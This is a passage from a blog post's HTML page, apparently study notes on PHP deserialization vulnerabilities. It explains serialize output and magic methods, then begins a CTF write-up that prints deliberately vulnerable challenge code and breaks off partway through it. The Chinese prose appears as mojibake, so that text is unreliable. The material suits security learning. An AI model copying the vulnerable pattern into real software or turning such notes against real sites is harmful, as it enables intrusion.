<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Echoram"><meta name="copyright" content="Echoram"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®° | Echoram's blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/images/head.ico"><link rel="mask-icon" href="/images/head.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"echoram.tk","root":"/","title":["Echoram's","Blog"],"version":"1.3.0","mode":"auto","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><meta name="description" content="0x01 åŸç†1.1 åºåˆ—åŒ–åºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªå¯¹è±¡å‹ç¼©æˆä¸€ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œå¯ä»¥å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬åŒ–ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼ã€‚ ä¸¾ä¸ªæ —å­ï¼šæ­¤å¤„ä»£ç æ¥æºäº[1] &lt;?php class userInfo &amp;#123;     private $passwd &#x3D; &#39;weak&#39;;     protected $sex &#x3D; &#39;male&#39;;     public $name &#x3D; &#39;ama666&#39;;">
<meta property="og:type" content="article">
<meta property="og:title" content="ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®°">
<meta property="og:url" content="http://echoram.tk/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Echoram&#39;s blog">
<meta property="og:description" content="0x01 åŸç†1.1 åºåˆ—åŒ–åºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªå¯¹è±¡å‹ç¼©æˆä¸€ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œå¯ä»¥å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬åŒ–ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼ã€‚ ä¸¾ä¸ªæ —å­ï¼šæ­¤å¤„ä»£ç æ¥æºäº[1] &lt;?php class userInfo &amp;#123;     private $passwd &#x3D; &#39;weak&#39;;     protected $sex &#x3D; &#39;male&#39;;     public $name &#x3D; &#39;ama666&#39;;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094650.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094643.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201511.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201504.png">
<meta property="article:published_time" content="2021-04-28T00:00:00.000Z">
<meta property="article:modified_time" content="2021-04-30T13:00:21.408Z">
<meta property="article:author" content="Echoram">
<meta property="article:tag" content="ååºåˆ—åŒ–">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094650.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Echoram"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Echoram"><span class="site-author-status" title="çˆ±ä½ å‘¦~">ğŸ’˜</span></a><div class="site-author-name"><a href="/about/">Echoram</a></div><a class="site-name" href="/about/site.html">Echoram's blog</a><sub class="site-subtitle">å·±æ‰€ä¸æ¬²,å‹¿æ–½äºäºº</sub><div class="site-desciption">Talk is cheap,show me the code.</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">5</span></a></div><a class="site-state-item hty-icon-button" href="/comments/" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Jmhram" title="GitHub" target="_blank" style="color:#66ccff"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:mail@echoram.tk" title="E-Mail" target="_blank" style="color:#39c5bb"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">0x01 åŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 åºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 ååºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 PHPé­”æœ¯æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-BUUCTF-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-number">2.</span> <span class="toc-text">0x02 BUUCTF-[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 æºç åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-POC"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">0x03 Typechoååºåˆ—åŒ–æ¼æ´å¤ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 æ¼æ´ç®€ä»‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 æºç åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 å¤ç°æµç¨‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-payload%E6%9E%84%E9%80%A0%EF%BC%88%E5%8F%82%E8%80%83-5-%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 payloadæ„é€ ï¼ˆå‚è€ƒ[5]ï¼‰</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">0x04 å‚è€ƒ</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://echoram.tk/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Echoram"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Echoram's blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®°</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2021-04-27 20:00:00" itemprop="dateCreated datePublished" datetime="2021-04-27T20:00:00-04:00">2021-04-27</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2021-04-30 09:00:21" itemprop="dateModified" datetime="2021-04-30T09:00:21-04:00">2021-04-30</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="æœ¬æ–‡å­—æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="æœ¬æ–‡å­—æ•°">2.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ—¶é•¿"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="é˜…è¯»æ—¶é•¿">12m</span></span></span><span class="leancloud_visitors" id="/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-flag-title="ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®°"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/%E7%AC%94%E8%AE%B0/" style="--text-color:dimgray" itemprop="url" rel="index"><span itemprop="text">ç¬”è®°</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">ååºåˆ—åŒ–</span></a><a class="tag" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h3 id="0x01-åŸç†"><a href="#0x01-åŸç†" class="headerlink" title="0x01 åŸç†"></a>0x01 åŸç†</h3><h4 id="1-1-åºåˆ—åŒ–"><a href="#1-1-åºåˆ—åŒ–" class="headerlink" title="1.1 åºåˆ—åŒ–"></a>1.1 åºåˆ—åŒ–</h4><p>åºåˆ—åŒ–æ˜¯<font color=red><code>å°†ä¸€ä¸ªå¯¹è±¡å‹ç¼©æˆä¸€ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³•</code></font>ï¼Œå¯ä»¥å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬åŒ–ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼ã€‚</p>
<p><strong>ä¸¾ä¸ªæ —å­</strong>ï¼šæ­¤å¤„ä»£ç æ¥æºäº[1]</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">userInfo</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'weak'</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'male'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ama666'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">modifyPasswd</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getPasswd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$passwd</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$ama666</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">userInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ama666</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">modifyPasswd</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'strong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ama666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>è¾“å‡ºç»“æœä¸ºï¼š</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"userInfo"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"userInfopasswd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"strong"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"*sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"male"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"ama666"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

<span class="token shell-comment comment"># å«ä¹‰å¦‚ä¸‹ï¼š</span>
<span class="token shell-comment comment"># ' O:8:"userInfo":3: ' : è¯¥Objectåå­—ä¸ºå­—ç¬¦é•¿åº¦ä¸º8çš„"userInfo"ï¼Œæœ‰ä¸‰ä¸ªå±æ€§</span>
<span class="token shell-comment comment"># å¤§æ‹¬å·å†…çš„å†…å®¹æ˜¯å±æ€§çš„åå­—ã€åå­—çš„å­—ç¬¦é•¿åº¦ã€å€¼å’Œå…¶ä»–ä¿¡æ¯</span>
<span class="token shell-comment comment"># é’ˆå¯¹ä¸åŒæƒé™çš„å±æ€§ï¼Œè¡¨ç¤ºæ–¹å¼ä¹Ÿä¸åŒï¼šprivateå‰æ·»åŠ å¯¹è±¡åï¼ˆuserInfoï¼‰</span>
<span class="token shell-comment comment">#                               protectedå‰æ·»åŠ æ˜Ÿå·ï¼ˆ*ï¼‰</span>
<span class="token shell-comment comment">#                               publicæ²¡æœ‰å‰ç¼€</span></code></pre>
</blockquote>
<p>å› æ­¤ï¼Œä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–ä¹‹åï¼Œå­—ç¬¦ä¸­ä¹Ÿå°±åªæœ‰å¯¹è±¡åã€å¯¹è±¡çš„å±æ€§é”®å€¼å¯¹ï¼Œå¹¶ä¸åŒ…å«æ–¹æ³•</p>
<p><font color=red><code>æ³¨ï¼šprivateå±æ€§åœ¨åºåˆ—åŒ–çš„æ—¶å€™è¿˜åŒ…å«ç©ºå­—èŠ‚ï¼Œæ‰€ä»¥ä¸€èˆ¬è¦ç¼–ç æ“ä½œ</code></font></p>
<h4 id="1-2-ååºåˆ—åŒ–"><a href="#1-2-ååºåˆ—åŒ–" class="headerlink" title="1.2 ååºåˆ—åŒ–"></a>1.2 ååºåˆ—åŒ–</h4><p>ååºåˆ—åŒ–æ˜¯å°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²â€è§£å‹ç¼©â€æˆå¯¹è±¡çš„è¿‡ç¨‹ã€‚</p>
<p><strong>ä½†æ˜¯</strong>ï¼Œå½“è¿™ä¸ªå­—ç¬¦ä¸²è¢«è¿˜åŸçš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šåŒ…å«ä»»ä½•æ–¹æ³•ã€‚å› æ­¤ï¼Œååºåˆ—åŒ–çš„å¯¹è±¡æƒ³è¦ä½¿ç”¨åŸå…ˆçš„æ–¹æ³•å¿…é¡»ä¾æ‰˜äº<strong>åŸŸ</strong>ï¼Œè„±ç¦»äº†åŸæœ¬çš„åŸŸï¼Œååºåˆ—çš„å¯¹è±¡æ— æ³•ä½¿ç”¨ä¹‹å‰çš„æ–¹æ³•ã€‚</p>
<h4 id="1-3-PHPé­”æœ¯æ–¹æ³•"><a href="#1-3-PHPé­”æœ¯æ–¹æ³•" class="headerlink" title="1.3 PHPé­”æœ¯æ–¹æ³•"></a>1.3 PHPé­”æœ¯æ–¹æ³•</h4><p>åœ¨PHPä¸­ï¼Œæœ‰ä¸€äº›é­”æœ¯æ–¹æ³•ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œä¼šè‡ªåŠ¨è§¦å‘ï¼Œå¦‚æœè¿™äº›å‡½æ•°ä¸­ä¸å¹¸<del>(nice)</del>å­˜åœ¨ä¸€äº›å¯åˆ©ç”¨çš„å‡½æ•°ï¼Œå°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ”»å‡»ã€‚16ä¸ªé­”æ³•å‡½æ•°å¦‚ä¸‹ï¼š</p>
<blockquote>
<ul>
<li>_autoload() : å½“ä½¿ç”¨æœªå®šä¹‰çš„ç±»æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨è¯¥å‡½æ•°ï¼ˆ7.2.0ç‰ˆæœ¬è¢«å¼ƒç”¨ï¼‰</li>
<li>__call() : è°ƒç”¨æœªå®šä¹‰æˆ–ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨</li>
<li>__callStatic() : è°ƒç”¨ç±»çš„ä¸€ä¸ªä¸å­˜åœ¨çš„é™æ€æ–¹æ³• ( ä¸å­˜åœ¨æˆ–è¯¥æ–¹æ³•ä¸å¯è®¿é—® ) æ—¶è‡ªåŠ¨è°ƒç”¨</li>
<li>__clone() : PHP å¯¹è±¡çš„æ‹·è´å®Œæˆåï¼Œè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ï¼ˆæ³¨æ„PHPçš„æ‹·è´æ˜¯æµ…æ‹·è´ï¼‰</li>
<li>__construct() : æ„é€ å‡½æ•°ï¼Œæ­¤å‡½æ•°ä¼šåœ¨åˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹æ—¶è‡ªåŠ¨è°ƒç”¨</li>
<li>__debugInfo() : ç”¨äºå®šåˆ¶å¯¹è±¡çš„ <code>var_dump()</code> è¾“å‡ºç»“æœï¼Œè°ƒç”¨<code>var_dump()</code> æ—¶è‡ªåŠ¨è°ƒç”¨</li>
<li>__destruct() : å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…ç±»è¢«é”€æ¯çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œç¨‹åºç»“æŸä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨ææ„å‡½æ•°</li>
<li>__get() : è¯»å–ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§å€¼çš„æ—¶å€™ï¼Œæ­¤é­”æ³•å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨</li>
<li>__invoke() : ä¼šåœ¨å°†ä¸€ä¸ªå¯¹è±¡å½“ä½œä¸€ä¸ªæ–¹æ³•æ¥ä½¿ç”¨æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</li>
<li>__isset() : åˆ¤æ–­å±æ€§æ˜¯å¦å®šä¹‰æ—¶ï¼Œè‹¥å±æ€§ç§æœ‰æˆ–æœªå®šä¹‰ï¼Œåˆ™è‡ªåŠ¨è°ƒç”¨</li>
<li>__set() : ç»™ç±»çš„å®ä¾‹çš„ä¸å­˜åœ¨çš„å±æ€§æˆ–ä¸å¯è®¿é—®çš„å±æ€§èµ‹å€¼</li>
<li>__set_state() :  ç”¨<code>var_export()</code>è¾“å‡ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨</li>
<li>__sleep() : è¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™ï¼Œå…ˆè°ƒç”¨æ­¤å‡½æ•°ï¼Œç”¨äºå®šåˆ¶åºåˆ—åŒ–ç»“æœï¼Œå‰”é™¤æ— éœ€åºåˆ—åŒ–çš„å±æ€§</li>
<li>__toString() : å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ ¼å¼å¤„ç†æ—¶ä¼šè‡ªåŠ¨è§¦å‘ï¼Œéœ€è¦æ­¤å‡½æ•°ä¸­çš„åŠŸèƒ½è¯­å¥å°†å¯¹è±¡è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œè¯¥å‡½æ•°å¿…é¡»è¦æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²æ ¼å¼çš„è¿”å›å€¼</li>
<li>__unset() : é”€æ¯ç§æœ‰å±æ€§æˆ–ä¸å­˜åœ¨çš„å±æ€§æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</li>
<li>__wakeup() : è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå…ˆè°ƒç”¨æ­¤å‡½æ•°</li>
</ul>
</blockquote>
<p><font color=red><code>æ³¨ï¼šæ‰€æœ‰é­”æ³•å‡½æ•°å¿…é¡»å£°æ˜ä¸ºpublic</code></font></p>
<h3 id="0x02-BUUCTF-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#0x02-BUUCTF-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="0x02 BUUCTF-[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>0x02 BUUCTF-[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h3><h4 id="2-1-æºç åˆ†æ"><a href="#2-1-æºç åˆ†æ" class="headerlink" title="2.1 æºç åˆ†æ"></a>2.1 æºç åˆ†æ</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
